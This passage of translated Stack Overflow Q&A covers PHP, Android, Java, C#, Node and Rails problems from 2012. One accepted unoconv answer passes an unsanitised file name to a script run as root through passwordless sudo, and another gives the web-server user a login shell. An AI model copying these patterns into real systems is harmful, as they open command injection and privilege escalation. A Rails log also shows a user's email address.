while($row = mysql_fetch_array($result)) {
   echo "Your Pic ID: $row['PicID']"; 
} 
```

## 不要使用`mysql_*` [查看此评论](https://stackoverflow.com/questions/11427953/how-to-select-database-and-use-join-with-mysql-php-database/11427982#comment-15075223)

## 更新

现在我们已经掌握了全部事实——即您尝试跨多个数据库连接……问题是您的查询不完整……试试这个：

```
SELECT Pic.PicID FROM Pics.Pic Pic LEFT JOIN SeenPics.Seen Seen ON Pic.PicID = Seen.PicID 
```

# php - 设置数组输入规则 - Yii 框架

> ID：11427955
> 
> 赞同：0
> 
> 时间：2012-07-11T07:48:09.193
> 
> 标签：php, yii

我正在为一个电子商务项目学习 yii 框架，到目前为止它进展顺利。我有一个房地产附加表格，该表格是使用数据库生成的。下面的代码生成表单 (/views/ad/_form)，并为输入字段命名，例如 detail["ad-title"]、detail["ad-image"] 等。

```
 <?php 
    $connection = Yii::app()->db;
    $command = $connection->createCommand("SELECT * FROM eml_ozellikler");
    $options = $command->queryAll();
    $command = $connection->createCommand("SELECT * FROM eml_kurallar");
    $rules = $command->queryAll();
    $i = 0;
    foreach($options as $option){
        echo '<div class="row">';
        echo $form->labelEx($model, 'detail["'.$option['name'].'"]');
        switch($option['tur']){
            case "textfield":
                echo $form->textField($model, 'detail["'.$option['name'].'"]');
                break;
            case "textarea":
                echo $form->textArea($model, 'detail["'.$option['name'].'"]', array('rows'=>'5','cols'=>'40'));
                break;
            case "integer":
                echo $form->textField($model, 'detail["'.$option['name'].'"]');
                break;
            case "selectbox":
                CHtml::dropDownList($option['label'], 'detail["'.$option['name'].'"]', $rules[$i]['values']);
                break;
            case "radio":
                break;
            case "file":
                echo $form->fileField($model, 'detail["'.$option['name'].'"]');
                break;
            case "image":
                break;
        }
        echo $form->error($model,'detail["'.$option['name'].'"]');
        echo '</div>';
        $i++;
    }
?> 
```

问题是在给他们规则的时候。规则只是为了寻找，当我添加到规则时

```
array('detay["ad-title"]', 'required'), 
```

然后，该字段是必需的并获得 (*)。但是当我提交表单时，它会给出一个错误，说“Ad.detail [“ad-title”]”值未定义。

没有规则，我可以使用 $_POST['Ad']['detail']["ad-title"] 等正确发布和获取发布的值。

还; 我检查了 Yii 框架文档，但除了表格输入和表单生成器之外找不到任何有用的东西，而且我无法在我的代码中实现它。因为我不想在我的模型中创建变量，我只想使用一个变量和规则发送数据。

谢谢，çağlar。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-01T12:18:32.580

正如您所提供的，我没有找到任何关于此的规则。

```
array('detay["ad-title"]', 'required'), 
```

如果 ad-title 是您的表字段名称，那么您可以编写。

```
array('ad-title', 'required'), 
```

而已 ...

否则你需要学习规则，下面是你可以学习的链接之一。

[http://www.yiiframework.com/wiki/56/](http://www.yiiframework.com/wiki/56/)

谢谢。

# android - 从 URL 加载图像并在地图视图中覆盖图像？

> ID：11427963
> 
> 赞同：0
> 
> 时间：2012-07-11T07:49:10.377
> 
> 标签：android, overlay

我有一个列表视图，它由两个文本视图和一个图像视图组成。在布局的顶部（列表视图上方），我有一个按钮来显示地图中的所有列表以及相应的图像视图和文本视图。如何在 mapview 中叠加 imageview ..？

注意：我在 res - drawable 中没有任何图像。我只有图片网址。

我可以固定相应的位置..！但我不知道如何使用 imageview 为那个特定的 baloon(pin) 添加叠加层。

此外，我必须在地图视图中从当前的纬度和经度绘制一个 2 公里的透明圆圈。是否可以在地图视图中画一个圆圈..？

帮助我实现上述目标。

以下是我用来显示地图别针的代码：

```
 Double lat1 = (Double.parseDouble(latitude)) * 1E6;
    Double lng1 = (Double.parseDouble(longitude)) * 1E6;

    com.google.android.maps.GeoPoint point = new com.google.android.maps.GeoPoint(
            lat1.intValue(), lng1.intValue());
    controller.animateTo(point);
    controller.setZoom(10);

    mapOverlays = mapView.getOverlays();
    drawable = this.getResources().getDrawable(R.drawable.pin);
    balloon1 = new MyItemizedOverlay_Initial(drawable, mapView); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-21T00:48:48.057

您应该扩展 com.google.android.maps.Overlay 以将图像添加到 mapView。然后覆盖draw方法。因此，您可以获取 URI 添加位图并在画布中绘制它。将下面的代码放在draw方法中。

```
@Override
public void draw(Canvas canvas, MapView mapView, boolean shadow) {
    super.draw(canvas, mapView, shadow);
    try {
        URL url = new URL("http://your.url.com/your-file.jpg");
        Bitmap bitmap = BitmapFactory.decodeStream(url.openStream());
        canvas.drawBitmap(bitmap, point.x - bitmap.getWidth() / 2, point.y - bitmap.getHeight() / 2, null);
    } catch (MalformedURLException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } catch (IOException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
} 
```

# php - 如何从 php 文件启动 unoconv

> ID：11427965
> 
> 赞同：6
> 
> 时间：2012-07-11T07:49:24.763
> 
> 标签：php, shell, pdf, command

我想从脚本 php 启动命令“unoconv”。

```
$command = '/usr/bin/unoconv --server localhost --port 2002 --format=pdf file.rtf >/dev/null 2>/dev/null';
$rc = system( $command );
echo $rc; 
```

该命令不返回任何结果，并且未创建文件。

我认为是访问 www-data 和 unoconv 的问题。

当我在 shell 中启动命令时，会创建文件。

任何想法？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-11T08:01:04.110

You can add command unoconv to sudoers. I do this in this way:

I create wrapper bash script in for example /usr/local/bin where I have command `unoconv`.

```
#!/bin/bash

if [ -z "$1" ]; then
    echo "Must pass file";
    exit 10;
fi

/usr/bin/unoconv -f pdf $1.rtf 
```

after this I adding entry in `/etc/sudoers.d`:

```
www-data    ALL=NOPASSWD: /usr/local/bin/unoconv.sh 
```

And now you can call script in php:

```
exec('sudo /usr/local/bin/unoconv.sh '.$fileName); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:59:07.420

尝试运行

```
$output = `/usr/bin/unoconv --server localhost --port 2002 --format=pdf file.rtf`; 
```

而是查看错误消息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-01-26T18:31:09.293

对我来说是这样的：

```
$cmd = "/usr/bin/unoconv -f docx files/thefile";
shell_exec($cmd); 
```

当然，您必须事先执行此操作（如果您从网络上启动 php 脚本）：

```
chown -R www-data:www-data files/ 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-09-27T23:55:23.720

我在运行 Apache 时找到了解决此问题的方法。您必须为`www-data`用户创建主文件夹

```
 sudo mkdir /home/www-data
 sudo chown www-data /home/www-data 
```

最后，我们必须为`www-data`用户编辑主目录和默认 shell

```
sudo vim /etc/passwd 
```

对于`www-data`最后两个字符串的条目，必须分别替换为

```
/home/www-data
/bin/bash 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-04-21T22:05:47.613

您可能会遇到 LibreOffice、OpenOffice 或 soffice 无法写入当前用户`$HOME`目录的问题。

通过运行下面的命令，我能够识别正确的`$HOME`目录并查看正在生成的错误。

```
$cmd = 'echo $HOME & unoconv -vvvv --format %s --output %s %s 2>/tmp/unoconv.debug.txt';
exec($cmd); 
```

的详细输出`$cmd`将生成写入文件：`/tmp/unoconv.debug.txt`.

就我而言，输出是：

```
Verbosity set to level 5
DEBUG: Connection type: socket,host=127.0.0.1,port=2002,tcpNoDelay=1;urp;StarOffice.ComponentContext
DEBUG: Existing listener not found.
DEBUG: Launching our own listener using /usr/lib64/libreoffice/program/soffice.bin.
Failed to connect to /usr/lib64/libreoffice/program/soffice.bin (pid=32012) in 6 seconds.
Connector : couldn't connect to socket (Success)
Error: Unable to connect or start own listener. Aborting. 
```

命令以 root 和`sudo -u nobody`. 看到此输出后，我意识到主目录存在问题。

**感谢 Dag Wieers**的帮助 - 我希望这可以帮助其他 unoconv 开发人员进行调试。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-09-28T07:16:45.700

就这么简单

```
$output = shell_exec('/opt/libreoffice5.0/program/python unoconv -f rtf test.html'); 
```

编辑路径以适应您的配置。

它只是工作！

# javascript - 响应图像（通过管道和 response.end()）会导致奇怪的行为

> ID：11427969
> 
> 赞同：4
> 
> 时间：2012-07-11T07:49:51.263
> 
> 标签：javascript, node.js

我使用此代码将图像传送给我的客户：

```
req.pipe(fs.createReadStream(__dirname+'/imgen/cached_images/' + link).pipe(res)) 
```

它**确实**有效**，但**有时图像未完全传输。但是在客户端（浏览器）和服务器端（node.js）都不会抛出错误。

我的第二次尝试是

```
var img = fs.readFileSync(__dirname+'/imgen/cached_images/' + link);
res.writeHead(200, {
  'Content-Type' : 'image/png'
});
res.end(img, 'binary'); 
```

但它会导致同样的奇怪行为......

有人对我有线索吗？

（抽象代码...）

```
var http = require('http');
http.createServer(function (req, res) {
    Imgen.generateNew(
        'virtualtwins/www_leonardocampus_de/overview/28',
        'www.leonardocampus.de',
        'overview',
        '28',
        null,
        [],
        [],
        function (link) {
          fs.stat(__dirname+'/imgen/cached_images/' + link, function(err, file_info) {
                if (err) { console.log('err', err); }
                  console.log('file info', file_info.size);
                  res.writeHead(200, 'image/png');
                  fs.createReadStream(__dirname+'/imgen/cached_images/' + link).pipe(res);
              });
        }
        );
}).listen(13337, '127.0.0.1'); 
```

`Imgen.generateNew`只需创建一个新文件，将其保存到磁盘并返回路径（链接）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-04-26T11:44:55.543

What the problem was: I had 2 different writeStreams! If WriteStream#1 is closed, the second should be closed too and then it all should be piped.

But node is asynchronous so while one has been closed, the other one hasn't. Even the stream.end() was called... well you always should wait for the close event!

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-11T08:09:38.847

我以前用过这个，所需要的只是在`function (req, res) {`：

```
var path = ...; 
res.writeHead(200, {
  'Content-Type' : 'image/png'
});
fs.createReadStream(path).pipe(res); 
```

where`path`是要发送的文件的计算路径。`.pipe()`将数据从读流传输到写流，在读流结束时调用end，所以不需要使用`res.end()`after。

# java - 如何将 GWT 方法作为参数传递给 Javascript 函数？

> ID：11427970
> 
> 赞同：0
> 
> 时间：2012-07-11T07:49:53.907
> 
> 标签：java, javascript, gwt, jsni

**概述**

*   有一个 GWT 方法称为：`private void handleError()`
*   有一个 JSNI Javascript 函数称为：`private native void registerErrorHandler()`
*   本机 javascript 函数从第三方 Javascript 库调用另一个函数：`foo.attachEvent("EventName", handlerReference);`

**功能性**

我需要将 GWT 方法作为函数参数传递给`foo.attachEvent()`函数，我尝试了几种方法：

`foo.attachEvent("Error", registerErrorHandler);`-> 类型不匹配异常

`foo.attachEvent("Error", this.@package.foo::registerErrorHandler());`-> 类型不匹配异常

```
var handler = this.@package.foo::registerErrorHandler()();
foo.attachEvent("Error", handler); 
```

-> 类型不匹配异常

**纯Javascript**

当我用纯 Javascript 编写它时，它正在工作：

```
function handleError() {
    alert("Error");
}
function registerErrorHandler() {
    var event = "Error";
    var handler = handleError;

    foo.attachEvent (event, handler);
} 
```

我怎样才能将它实现到 GWT 中？我在完全理解 Javascript - Java Objects 转换时遇到了很多问题。我将`handleError`函数引用理解为`JavaScriptObject`，但我无法使用该信息使其工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:54:57.830

您的代码需要看起来像这样：（只有一次大括号，因此该函数不被执行......）

```
var handler = this.@package.foo::registerErrorHandler();
foo.attachEvent("Error", handler); 
```

但是您还想做的是将您的函数包装在 $entry 函数中，以便您的未捕获异常处理程序可以工作：

```
var handler = this.@package.foo::registerErrorHandler();
foo.attachEvent("Error", $entry(handler)); 
```

您始终可以做的是构建一个直接调用您的 gwt 函数的 js 函数：

```
var that = this;
var handler = function(){
    that.@package.foo::registerErrorHandler()();
};
foo.attachEvent("Error", $entry(handler)); 
```

# c# - 如何在 .net 序列化中保留默认值

> ID：11427972
> 
> 赞同：0
> 
> 时间：2012-07-11T07:50:03.873
> 
> 标签：c#, xml-serialization

我将以下实体基类标记为可序列化：

```
[Serializable]
public abstract class EntityBase
{
    public bool Is_ActiveNull = true;
    [XmlElement(ElementName = "Is_ActiveFromNull")]
    ... 
```

然后我有从基本实体继承的具体实体：

```
[Serializable]
public class ContactEntity : EntityBase
{
 ... 
```

我有一个 WCF 服务，它使用这个实体作为合同中的输入参数。

当我从客户端创建服务引用时，它会创建一个 reference.cs，它忽略字段 Is_ActiveNull 的默认值。

这是 reference.cs 文件中的 EntityBase 类：

```
public partial class EntityBase : object, System.Runtime.Serialization.IExtensibleDataObject, System.ComponentModel.INotifyPropertyChanged 
{
    private bool Is_ActiveNullField;

    [System.Runtime.Serialization.DataMemberAttribute(IsRequired=true)]
    public bool Is_ActiveNull {
        get {
            return this.Is_ActiveNullField;
        }
        set {
            if ((this.Is_ActiveNullField.Equals(value) != true)) {
                this.Is_ActiveNullField = value;
                this.RaisePropertyChanged("Is_ActiveNull");
            }
        }
    }
    ... 
```

在这种情况下，Is_ActiveNullField 默认设置为 false。

我的问题是如何保留默认值？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T08:00:56.797

Their is no such attribute that will preserve the default value for public bool Is_ActiveNull

But you can achieve it when Deseralizing happens like this

```
You will have to add EmitDefaultValue on you field

 [System.Runtime.Serialization.DataMemberAttribute(IsRequired=true, EmitDefaultValue=false)]
    public bool Is_ActiveNull {

and then 

[OnDeserializing]
    void BeforeDeserialization(StreamingContext ctx)
    {
        this.Is_ActiveNull = false;
    } 
```

> Mind you the MSDN also gives a Not on practice for EmitDefaultValue
> 
> Setting the EmitDefaultValue property to false is not a recommended practice. It should only be done if there is a specific need to do so (such as for interoperability or to reduce data size).

# c# - HttpResponseMessage 的通用版本是否已从 ASP.NET WebApi 中删除？

> ID：11427973
> 
> 赞同：23
> 
> 时间：2012-07-11T07:50:08.007
> 
> 标签：c#, .net, asp.net-web-api

我刚刚安装完 VS 2012 RC 并开始使用 ASP.NET Web API。我的工作基于 PluralSight 的一些教程，我一直将其用作参考。

在我使用的每篇教程和文章中，我注意到他们`HttpResponseMessage`在返回类型中使用通用版本的`Action`，但令我惊讶的是，在编码时我无法使用这个对象。我认为问题可能只是名称空间引用不正确，但似乎并非如此。

谁能向我指出一些有关如何利用`HttpResponseMessage`PluralSight 在他们的视频中使用的通用对象的源代码或参考材料？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-07-11T07:50:08.537

搜索答案我找到[了这篇文章](http://aspnetwebstack.codeplex.com/discussions/355170) ，它指出通用版本已被删除
，所以现在只需提及返回类型为类型`HttpresponseMessage`，并在实际返回响应时使用
`Request.CreateResponse<T>(params);`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-11T15:05:45.443

是的，我也在看同样的事情.. HttpResponseMessage 的通用版本最近被删除了.. 因为它不是类型安全的

# c# - 锁定添加到集合中

> ID：11427975
> 
> 赞同：0
> 
> 时间：2012-07-11T07:50:14.313
> 
> 标签：c#, collections, concurrency, locking, task-parallel-library

我的第一个想法是关于Lock Will 在我测试`SpinLock`时`Concurrent Collections` 在这里工作，但它更贵！

这里的过程基于并行编程。并且该任务正在并行运行多个。

在 SpinLock 版本期间，我有时会随机遇到一个错误，类似于`"Index out of range"`.

我写的 SpinLock 版本无法完成我想要的工作，可以对其进行任何更改以使其正常工作吗？或者它不是为与这种情况完全相关而构建的吗？

任何信息？

它有更好的选择吗？

这就是我所做的：

```
 lock (lckRelatz)
     {
         relatz.Add(st);
     } 
```

**这是 SpinLock 版本 - 这是在并行运行的方法中：**

```
 SpinLock spinLk = new SpinLock();
        bool gotLock = false;
        try
        {
            spinLk.Enter(ref gotLock);
            relatz.Add(st);
        }
        finally
        {
            if (gotLock)
                spinLk.Exit();
        } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T08:01:25.533

It seems like you are creating new `SpinLock` for each thread. That will not actually lock anything. You need to have one `SpinLock` and use that from all of your threads.

But using a concurrent collection is even better solution. They are highly optimized and using them means you don't have to worry about all the locking yourself.

# silverlight - 如何在组合框中显示 BusyIndi cator

> ID：11427976
> 
> 赞同：1
> 
> 时间：2012-07-11T07:50:14.333
> 
> 标签：silverlight, busyindicator

我将 Silverlight 5 与 WCF Ria 服务一起使用。为了快速开发，我编写了一个基于提供程序的系统来填充组合框。当我为组合设置提供程序并将 EditValue 绑定到 ViewModel 时，一切正常。

```
<Controls:BLComboBoxEdit2 x:Name="cbeDepartmentId" 
  EditValue="{Binding Path=Selected.DepartmentId, Mode=TwoWay" 
  ComboDataProvider="{Binding Path=DepartmentComboDataProvider}" /> 
```

但是为了在组合等待提供者加载数据时通知用户，我需要一个 BusyIndi​​cator。我不知道如何在继承的控件中显示 BusyIndi​​cator（我们可以通过覆盖 OnPaint 事件等在 WinForm 时代做到这一点）所以我创建了一个 UserControl，xaml 是这样的（我们使用的是 DevExpress ComboBoxEdit），

```
<UserControl ...>

<UserControl.Resources>
    <ResourceDictionary>
        <ResourceDictionary.MergedDictionaries>
            <ResourceDictionary Source="../Assets/Styles.xaml" />
        </ResourceDictionary.MergedDictionaries>
    </ResourceDictionary>
</UserControl.Resources>

<Grid>
    <dxe:ComboBoxEdit x:Name="combo" />
    <toolkit:BusyIndicator x:Name="busyIndicator" Style="{StaticResource AjaxBusyIndicator}"
            IsBusy="{Binding Path=ComboDataProvider.IsWorking}">
    </toolkit:BusyIndicator>
</Grid> 
```

它看起来像这样，

![工作组合](../Images/db557c56f9dce0ed634af05f4ef0f2ed.png)

在某些情况下（对于网格列等），我们需要一个 ComboBoxEdit 派生控件，而不是 UserControl。所以我开始修改代码，但我卡住了。我不知道如何添加要在控件忙碌时显示的子控件（或覆盖控件？）。

```
<dxe:ComboBoxEdit ...>

<dxe:ComboBoxEdit.Resources>
    <ResourceDictionary>
        <ResourceDictionary.MergedDictionaries>
            <ResourceDictionary Source="../Assets/Styles.xaml" />
        </ResourceDictionary.MergedDictionaries>
        <Common:PublicStrings x:Key="ResourceStrings" />
    </ResourceDictionary>
</dxe:ComboBoxEdit.Resources>

<Grid>
    <toolkit:BusyIndicator x:Name="busyIndicator" Style="{StaticResource AjaxBusyIndicator}"
            IsBusy="{Binding Path=ComboDataProvider.IsWorking}" />
</Grid> 
```

当我运行上面的代码时，组合正常工作，但没有显示忙碌指示符（正如这段代码所预期的那样，忙碌指示符成为组合的内容，如果我弹出组合[正在加载时]我可以看到 BusyIndi​​cator :) 但是首次加载后，由于内容已更改，它会消失）。

有没有办法做到这一点？现在我正在尝试在代码后面设置内容（在 IsBusy 更改后，我想将内容设置为 BusyIndi​​cator 或保留为默认值），但没有运气。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-12T06:01:30.397

1.  尝试将两个控件都表示组合框和busyindicator放在同一个位置，就像放在网格的同一列上，并在异步调用之前使IsBusy = true（两者具有相同的高度和重量）并在完成事件时将其更改为false

2.  将组合框作为内容放入 BusyIndi​​cator 中

    ```
     <toolkit:BusyIndicator x:Name="busyIndicator" Style="{StaticResource AjaxBusyIndicator}" IsBusy="{Binding Path=ComboDataProvider.IsWorking}">
       <ComboBox/>
    </toolkit:BusyIndicator> 
    ```

# java - 为分布式缓存配置 ehcache

> ID：11427981
> 
> 赞同：0
> 
> 时间：2012-07-11T07:50:40.313
> 
> 标签：java, ehcache

我想使用ehcacheas分布式ehcache。分布式我的意思是我有多个appserver，每个都有自己的ehcache，如果我在一个appserver缓存中放置/更新一个对象，所有其他缓存（在其他应用服务器中）必须自动同步/更新。

现在我不希望在某些配置中硬编码所有其他缓存的地址（主机名）。因为我可以在多个盒子中部署我的代码，并且可以随时添加新盒子，我不想修改所有机器上的配置文件。

我可以远程拉取配置文件吗？我可以以 IP 范围的形式添加服务器列表吗？还是网络主机类？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T08:22:08.067

如果您不想自己实现它，请考虑使用[Terracotta 。](http://terracotta.org/)[你可以在这里](http://blog.retep.org/2011/09/29/362/)找到一个样本。

# java - Java 动态事务代理 - 连接初始化

> ID：11427985
> 
> 赞同：0
> 
> 时间：2012-07-11T07:50:58.120
> 
> 标签：java, reflection, transactions

我有这样的东西：
1）带有方法的**DAO类**，用于执行事务，例如使用java.sql.Connection`withdrawSum(int idAccount, float amount)`和`putSum(int idAccount, float amount)`java.sql.PreparedStatement类对DB执行原子操作。
2) java.lang.reflect。**InvocationHandler**实现者，whick 用于在事务前获取连接和事务后提交/回滚：

```
public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
    Connection connection = null;
    try{
        connection = DaoUtil.INSTANCE.getConnection();
        connection.setAutoCommit(false);
        method.invoke(connection, args);
        connection.commit();
    } catch(InvocationTargetException ex){
        connection.rollback();
    } finally{
        DaoUtil.INSTANCE.closeConnection(connection);
    }
    return null;
} 
```

3)**事务管理器**，它创建代理实例并在其帮助下调用执行事务的方法，如下所示：

```
TransactionManager transManager = new TransactionManager();
InvocationHandler transHandler = new MyInvocationHandler(transManager);
TransactionManager proxy = (TransactionManager) Proxy.newProxyInstance(
            transManager.getClass().getClassLoader(), transManager.getClass().getInterfaces(), transHandler);
proxy.transferMoney(withdrawAccountid, putAccountId, transactionSum); 
```

......

```
 public void transferMoney(int withdrawAccountid, int putAccountId, float transactionSum){
            AccountDao.getInstance().withdrawSum(withdrawAccountid, transactionSum);
            AccountDao.getInstance().putSum(putAccountId, transactionSum);
    } 
```

**问题是**：要在 DAO 方法中执行语句，我需要初始化**Connection**对象。它被初始化并传递给InvocationHandler的*调用方法。*它应该如何在 DAO 方法中正确初始化？有任何想法吗？提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T08:47:19.117

由于事务自然与线程相关联，因此这里的典型方法是在事务范围内存储`Connection`在存储中。[`ThreadLocal`](http://docs.oracle.com/javase/6/docs/api/java/lang/ThreadLocal.html)

然后，您可以使用不同的方法使这些连接对 DAO 可用：

*   DAO 可以`Connection`通过调用一些静态方法来获取 s

*   可以将自定义`DataSource`注入 DAO - 它的`getConnection()`方法将返回与当前事务关联的连接，请注意连接应该被代理以便忽略`close()`。这种方法不会将您的 DAO 与事务管理代码结合起来。

另请注意，所有这些东西都已由某些库实现，例如 Spring Framework。也许您可以利用它而不是创建自己的解决方案，或者至少看看他们的设计（在 Spring 中，获取连接的不同方法分别由`DataSourceUtils`和实现`TransactionAwareDataSourceProxy`）。

**也可以看看：**

*   [10\. 交易管理](http://static.springsource.org/spring/docs/3.0.x/spring-framework-reference/html/transaction.html)
*   [12\. 使用 JDBC 访问数据](http://static.springsource.org/spring/docs/3.0.x/spring-framework-reference/html/jdbc.html)

# c# - 如何从实体对象中查询数据以及 ICollection 数据

> ID：11427996
> 
> 赞同：2
> 
> 时间：2012-07-11T07:51:42.533
> 
> 标签：c#, entity-framework-4, code-first

我有这些课程

```
public class CoffeeUser
{
    public CoffeeUser()
    {
        DrinkedCoffees = new Collection<DrinkedCoffee>();
    }

    public long CoffeeUserID { get; set; }

    public Guid Code { get; set; }

    public string FirstName { get; set; }
    public string LastName { get; set; }
    public string EMail { get; set; }

    public virtual ICollection<DrinkedCoffee> DrinkedCoffees { get; set; }
}

public class DrinkedCoffee
{
    public long DrinkedCoffeeID { get; set; }

    public DateTime DateDrinked { get; set; }
} 
```

如何查询 DrinkedCoffees 的所有项目以及 FirstName 和 LastName？结果应如下所示：

```
Tyler John 27.3.2012
Tyler John 28.3.2012
Tyler John 29.3.2012 
```

我已经尝试了几个查询，但到目前为止我都不成功。

这是我能够实现的最接近的：

```
 var list_4 = ctx.CoffeeUsers.Where(u => u.DrinkedCoffees.Count > 0).SelectMany(u => u.DrinkedCoffees).ToList(); 
```

好吧，我花了 45 秒在 sql 中执行此操作。还有 4 小时不做实体 :)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T08:07:00.177

怎么样

```
 var DrinkedCoffies = ctx.CoffeeUsers.SelectMany(u => u.DrinkedCoffees, (u, cof) => new { FirstName = u.FirstName, LastName = u.LastName, DateDrinked = cof.DateDrinked } ); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T08:02:30.117

假设您有一个名为 user 的对象，它是 CoffeeUser 的一个实例，您应该能够执行以下操作：

```
var drunkCoffees = from coffee in user.DrinkedCoffees
                   select new { user.LastName, user.FirstName, coffee.DateDrinked }; 
```

这将返回一个匿名类型的集合，其中包含用户的姓、名和他们喝咖啡的时间。

**编辑**只需重新阅读您的问题 - 在您的示例中，您需要执行更多类似这样的操作：

```
var drunkCoffees = from coffeeUser in ctx.CoffeeUsers
                   from coffee in coffeeUser.DrinkedCoffees
                   where coffeeUser.DrinkedCoffees.Count > 0
                   select new { user.LastName, user.FirstName, coffee.DateDrinked }; 
```

在这里，我从您的 CoffeeUsers 集合中选择，然后从他们的 DrinkedCoffees 集合中进行选择，其中计数大于 0。

然后，您可以通过执行以下操作来显示结果：

```
foreach(var drunkCoffee in drunkCoffees) {

    System.Console.WriteLine(string.format("{0} {1} {2}", drunkCoffee.LastName, drunkCoffee.FirstName, drunkCoffee.DateDrinked));

} 
```

希望有帮助！

詹姆士

# android - Android 应用程序在 NFC 标签中添加多条记录

> ID：11427997
> 
> 赞同：1
> 
> 时间：2012-07-11T07:51:49.570
> 
> 标签：android, nfc, ndef

大家，我是一个开发android应用程序的初学者，目前我需要在NFC标签中写入一些数据来检查我自己的NFC阅读器程序，但是我可以尝试的那些应用程序只能在标签中写入一条记录，不匹配我的要求是里面有几条记录，最后有一条AAR记录，所以我想问一下是否有人知道任何可以提供此功能的应用程序，或者以前有人写过这样的程序吗？谢谢！

```
public class Writer extends Activity {

NfcAdapter mAdapter;
PendingIntent mPendingIntent;
IntentFilter mWriteTagFilters[];
boolean mWriteMode;
Tag detectedTag;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_writer);
    mAdapter = NfcAdapter.getDefaultAdapter(this);
    mPendingIntent = PendingIntent.getActivity(this, 0,
            new Intent(this, getClass()).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP), 0);
    IntentFilter tagDetected = new IntentFilter(NfcAdapter.ACTION_TAG_DISCOVERED);
    mWriteTagFilters = new IntentFilter[] { tagDetected };

    //enableTagWriteMode();
    //Intent intent = getIntent();

}

private void enableTagWriteMode(){
    mWriteMode = true;
    mAdapter.enableForegroundDispatch(this, mPendingIntent, mWriteTagFilters, null);
}

private void disableTagWriteMode(){
    mWriteMode = false;
    mAdapter.disableForegroundDispatch(this);
}

public void SetTag(View view){
    EditText editText1 = (EditText) findViewById(R.id.edit_message1);
    EditText editText2 = (EditText) findViewById(R.id.edit_message2);
    String message1 = editText1.getText().toString();
    String message2 = editText2.getText().toString();
    byte[] textBytes1 = message1.getBytes();
    byte[] textBytes2 = message2.getBytes();
    NdefRecord textRecord1 = new NdefRecord(NdefRecord.TNF_WELL_KNOWN, 
            message1.getBytes(), new byte[]{}, textBytes1);
    NdefRecord textRecord2 = new NdefRecord(NdefRecord.TNF_WELL_KNOWN, 
            message2.getBytes(), new byte[]{}, textBytes2);
    NdefMessage mNdefMessage = new NdefMessage(
        new NdefRecord[]{
                textRecord1,
                textRecord2,
                NdefRecord.createApplicationRecord("android.reader")
        }
    );
    writeTag(mNdefMessage, detectedTag);    
}

public static void writeTag(NdefMessage message, Tag tag){
    int size = message.toByteArray().length;
    try {
        Ndef ndef = Ndef.get(tag);
        if (ndef != null){
            ndef.connect();
            if (ndef.isWritable() && ndef.getMaxSize() > size)
                ndef.writeNdefMessage(message);
        }else{
            NdefFormatable format = NdefFormatable.get(tag);
            if (format != null) {
                try {
                    format.connect();
                    format.format(message);
                }catch(IOException e){

                }
            }
        }
    }catch(Exception e){

    }
}

@Override
protected void onNewIntent(Intent intent){
    if(mWriteMode && NfcAdapter.ACTION_TAG_DISCOVERED.equals(intent.getAction()))
        detectedTag = intent.getParcelableExtra(NfcAdapter.EXTRA_TAG);        
}

@Override
public void onPause(){
      super.onPause();
    disableTagWriteMode();
}

@Override
public void onResume(){
      super.onResume();
    enableTagWriteMode();
}

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-12T02:18:00.727

您需要在清单文件中为您的应用程序提供 NFC 支持。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T17:49:26.183

看看[这个](http://code.google.com/p/nfc-eclipse-plugin/)（无耻插件）NFC Eclipse 插件，用于编辑 NDEF 消息，包括单个消息中的多个记录。还附带了一个适用于 android 的项目样板文件，我猜这就是你正在寻找的（？）。

# ruby-on-rails - 储蓄记录从导入到 activerecord

> ID：11427998
> 
> 赞同：0
> 
> 时间：2012-07-11T07:51:53.853
> 
> 标签：ruby-on-rails, activerecord, paperclip

我最近在我的 RoR 项目中添加了一个导入选项，该选项似乎正在上传文件，并将此文件成功存储到数据库中，但当它尝试创建新用户并保存它们时，我收到以下错误

```
Started GET "/imports/13/proc" for 127.0.0.1 at 2012-07-11 02:52:00 +1000
Processing by ImportsController#proc_csv as HTML
  Parameters: {"id"=>"13"}
  User Load (0.3ms)  SELECT "users".* FROM "users" WHERE "users"."id" = 1 LIMIT 1
  Import Load (0.1ms)  SELECT "imports".* FROM "imports" WHERE "imports"."id" = ? LIMIT 1  [["id", "13"]]
   (0.1ms)  begin transaction
  User Exists (0.2ms)  SELECT 1 FROM "users" WHERE "users"."email" = 'paul.mcguane1@westnet.com.au' LIMIT 1
   (0.1ms)  rollback transaction
   (0.1ms)  begin transaction
  User Exists (0.2ms)  SELECT 1 FROM "users" WHERE "users"."email" = 'compact721@***.com' LIMIT 1
   (0.1ms)  rollback transaction
   (0.1ms)  begin transaction
  User Exists (0.2ms)  SELECT 1 FROM "users" WHERE "users"."email" = 'paul.****@me.com' LIMIT 1
   (0.1ms)  rollback transaction
   (0.1ms)  begin transaction
